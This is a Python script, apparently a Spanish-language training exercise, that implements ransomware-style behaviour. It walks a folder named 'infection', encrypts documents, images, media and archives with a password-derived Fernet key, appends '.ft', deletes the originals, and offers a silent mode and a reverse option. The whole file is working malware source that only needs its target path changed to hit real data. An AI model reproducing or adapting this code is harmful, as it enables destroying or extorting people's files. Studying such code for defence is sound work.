import argparse
import os
import getpass
import base64
import hashlib
from cryptography.fernet import Fernet

target_extensions = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".csv", ".zip", ".rar", ".mp3", ".mp4", ".avi"]
# Crea un analizador de argumentos
parser = argparse.ArgumentParser(description='Infection: un programa de cifrado y descifrado de archivos.')

# Añade los argumentos
parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
parser.add_argument('-r', '--reverse', type=str, help='Revierte la infección utilizando la clave proporcionada')
parser.add_argument('-s', '--silent', action='store_true', help='Ejecuta el programa sin producir ningún output')

# Analiza los argumentos
args = parser.parse_args()

def get_encryption_key():
    encryption_key = getpass.getpass("Ingrese la clave de encriptación: ")
    encryption_key = base64.urlsafe_b64encode(hashlib.sha256(encryption_key.encode()).digest())
    return encryption_key

def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as f:
        file_content = f.read()

    encrypted_content = cipher_suite.encrypt(file_content)

    new_file_path = file_path + '.ft'
    with open(new_file_path, 'wb') as f:
        f.write(encrypted_content)

    os.remove(file_path)

def decrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as f:
        encrypted_content = f.read()

    decrypted_content = cipher_suite.decrypt(encrypted_content)

    new_file_path = file_path[:-3]
    with open(new_file_path, 'wb') as f:
        f.write(decrypted_content)

    os.remove(file_path)

if args.reverse:
    # Decrypt files
    encryption_key = base64.urlsafe_b64encode(hashlib.sha256(args.reverse.encode()).digest())
    cipher_suite = Fernet(encryption_key)

    for root, dirs, files in os.walk('infection'):
        for file in files:
            if file.endswith('.ft'):
                file_path = os.path.join(root, file)
                try:
                    decrypt_file(file_path, cipher_suite)
                    if not args.silent:
                        print(f"Archivo {file_path} descifrado.")
                except Exception as e:
                    print(f"Error al descifrar el archivo {file_path}: {e}")
else:
    # Encrypt files
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    for root, dirs, files in os.walk('infection'):
        for file in files:
            if file.endswith(tuple(target_extensions)):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path, cipher_suite)
                    if not args.silent:
                        print(f"Archivo {file_path} encriptado.")
                except Exception as e:
                    print(f"Error al encriptar el archivo {file_path}: {e}")
